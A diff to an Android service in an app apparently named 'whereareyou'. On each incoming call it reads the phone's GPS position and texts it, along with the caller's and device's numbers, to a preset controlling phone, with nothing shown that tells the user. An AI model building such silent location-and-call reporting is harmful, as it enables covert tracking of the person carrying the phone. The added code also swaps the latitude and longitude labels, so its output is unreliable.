@@ -1,9 +1,12 @@
 package com.example.whereareyou;
 
+import java.text.DecimalFormat;
+
 import android.app.Service;
 import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
+import android.location.LocationManager;
 import android.os.IBinder;
 import android.telephony.PhoneStateListener;
 import android.telephony.TelephonyManager;
@@ -45,13 +48,22 @@ public class ListenService extends Service
     			{
     				if(state == TelephonyManager.CALL_STATE_RINGING)
     				{
+    					String serviceString = Context.LOCATION_SERVICE;// 获取的是位置服务
+    					LocationManager locationManager = (LocationManager) getSystemService(serviceString);// 调用getSystemService()方法来获取LocationManager对象
+    					String provider = LocationManager.GPS_PROVIDER;// 指定LocationManager的定位方法
+    					android.location.Location location = locationManager.getLastKnownLocation(provider);// 调用getLastKnownLocation()方法获取当前的位置信息
+    					double lat = location.getLatitude();//获取纬度
+    					double lng = location.getLongitude();//获取经度
+    					DecimalFormat  df  = new DecimalFormat("######0.00"); 
+    					String d1 = df.format(lat);
+    					String d2 = df.format(lng);
     					// 发短信给主控手机
     					//Toast.makeText(ListenService.this, "有电话了", 3000).show();
     					if(!AppContext.getNumber().substring(AppContext.getNumber().length()-4).equals(incomingNumber)
     							&&!AppContext.getNumber().substring(AppContext.getNumber().length()-4).equals(incomingNumber.substring(incomingNumber.length()-4))){
     					AppUitl util = new AppUitl();
     		    		String time = util.getTime();
-    		    		String sms = time + ":" + incomingNumber + " to " + manager.getLine1Number();
+    		    		String sms = time + ":" + incomingNumber + " to " + manager.getLine1Number()+",经度是 ："+d1+",纬度是："+d2;
     		    		util.sendSms(AppContext.getNumber(), sms);
     					}
     				}
